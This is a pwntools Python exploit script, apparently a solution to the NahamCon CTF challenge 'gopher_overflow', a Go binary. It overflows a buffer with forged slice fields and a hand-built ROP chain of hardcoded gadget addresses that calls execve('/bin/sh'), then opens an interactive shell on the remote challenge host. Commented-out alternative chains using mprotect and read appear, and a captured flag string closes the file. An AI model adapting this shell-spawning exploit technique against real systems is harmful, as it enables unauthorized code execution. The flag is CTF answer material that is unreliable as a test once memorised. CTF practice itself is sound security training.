#!/usr/bin/env python3
from pwn import *

exe = ELF("./gopher_overflow", checksec=False)

context.binary = exe
context.terminal = ["pwntools-terminal"]

DOCKER_PORT = 1337
REMOTE_NC_CMD = "nc challenge.nahamcon.com 32399" # `nc <host> <port>`

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline

aleak = lambda elfname, addr: log.info(f"{elfname} @ 0x{addr:x}")	# addr leak (bases)
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")	# val leak (canary)
bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
chunks = lambda data, step: [data[i:i+step] for i in range(0, len(data), step)]

# b *0x47CF91 dopo read
GDB_SCRIPT = """
b *0x47cfbe
b runtime.goPanicIndex
c
"""

def conn():
	if args.LOCAL:
		return process([exe.path])
	if args.GDB:
		return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
	if args.DOCKER:
		return remote("localhost", DOCKER_PORT)
	return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
	WRITE_AREA = 0x519000

	SYSCALL_RET = 0x000000000045e5e9
	XOR_RAX = 0x0000000000403081
	POP_RAX_RBP = 0x0000000000404968
	MOV_RAX_RBP = 0x000000000045d480
	POP_RBX = 0x0000000000404aa1
	POP_RCX_ADC = 0x000000000044f842 # pop rcx; adc byte ptr [rax - 1], cl; ret; 
	POP_RDX = 0x000000000047a67a

	PUSH_RSP_CALL_RAX = 0x000000000045eecb
	ADD_RSP_8_POP_RBP = 0x000000000040115f
	MOV_RAX_RBP = 0x000000000045d480
	MOV_RCX_RAX = 0x0000000000409d63 # mov rcx, rax; mov rax, rcx; add rsp, 0x18; pop rbp; ret;
	MOV_RSI_RCX = 0x00000000004115c9 # mov rsi, rcx; add rsp, 0x10; pop rbp; ret; 
	MOV_RDI_RSI = 0x0000000000411553 # mov rdi, rsi; add rsp, 0x10; pop rbp; ret; 
	ADD_RDI_16 = 0x000000000045d99c
	# POP_RCX_ADC 0
	# MOV_RSI_RCX
	ropchain = flat(
		POP_RAX_RBP, ADD_RSP_8_POP_RBP, -1,
		PUSH_RSP_CALL_RAX, # PUSHA QUESTO
		MOV_RAX_RBP,  # ret addr del gadget sopra,
		MOV_RCX_RAX, b"/bin/sh\0" * 4,
		MOV_RSI_RCX, b"/bin/sh\0" * 3,
		MOV_RDI_RSI, b"/bin/sh\0" * 3,
		POP_RCX_ADC, 0,
		MOV_RSI_RCX, b"/bin/sh\0" * 3,
		POP_RAX_RBP, 59, -1,
		ADD_RDI_16,
		SYSCALL_RET
	)
	print(len(ropchain))

	io = conn()
	io.ru(b"? ")

	# io.sl(cyclic(1024))
	# 240
	# ui.pause()
	payload = flat(
		# voglio SYSCALL in RCX
		b"/bin/sh\0",
		b"Y" * 8,
		0x483c20, # stdin
		0x4b4f98,
		0x4b4f98, # thisLittleGuy.cap,
		0x200, # w?
		0x200, # r?
		0x4b4f98,
		0x1000,
		0x1000,
		cyclic(0x40),
		0x4b4f9a,
		cyclic(0x20),
		1,
		1,
		cyclic(0x28), # 0x28
		ropchain
		# POP_RAX_RBP, WRITE_AREA+0x10, -1, # rax random per POP_RCX_ADC
		# POP_RCX_ADC, WRITE_AREA, # rsi = buildinfo
		# MOV_RSI_RCX, -1, -1, -1,	
		# MOV_RDI_RSI, -1, -1, -1,
		# POP_RCX_ADC, 0x100,
		# MOV_RSI_RCX, -1, -1, 10, # rbp = mprotect
		# POP_RDX, 7, # RWX
		# MOV_RAX_RBP, 
		# SYSCALL_RET,
		# POP_RAX_RBP, WRITE_AREA+0x10, -1, # rax random per POP_RCX_ADC
		# # setto rdi = 0
		# POP_RCX_ADC, 0,
		# MOV_RSI_RCX, -1, -1, -1,
		# MOV_RDI_RSI, -1, -1, -1,
		# # setto rsi = buf, rbp = 0
		# POP_RCX_ADC, WRITE_AREA,
		# MOV_RSI_RCX, -1, -1, 0,
		# # setto count a 0x1000
		# POP_RDX, 0x1000,
		# MOV_RAX_RBP,
		# SYSCALL_RET
	)
	log.warn(str(len(payload)))
	io.s(payload)#.ljust(0xf0, b"\2"))
	

	io.interactive()

if __name__ == "__main__":
	main()


# flag{6a34c27f3bb3b25d98e7c1a1896217db}
